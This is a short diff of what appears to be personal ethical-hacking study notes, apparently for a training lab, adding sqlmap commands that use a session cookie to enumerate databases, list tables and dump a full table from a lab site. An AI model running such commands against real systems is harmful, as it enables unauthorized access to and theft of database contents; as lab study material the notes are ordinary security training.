@@ -7,9 +7,12 @@ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.
 
 
 **Gaining Access - dumping the SQL Database using cookie SQL Map**
+>>>enumerate databases
 sqlmap -u "URL" --cookie="PHPSESSID=1234" --dbs
+>>>List tables in DB
+sqlmap -u http://www.moviescope.com/viewprofile.aspx?id=1 --cookie="[cookie]" -D moviescope --tables
+>>>Dump full table
 sqlmap -u "TARGET_URL" --cookie="SESSION_COOKIE" -D DATABASE_NAME -T TABLE_NAME --dump
-sqlmap -u http://www.moviescope.com/index.aspx --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --dbs
 
 
 **MOBILE-download all the apk packages - apart from 3rd party APKs**
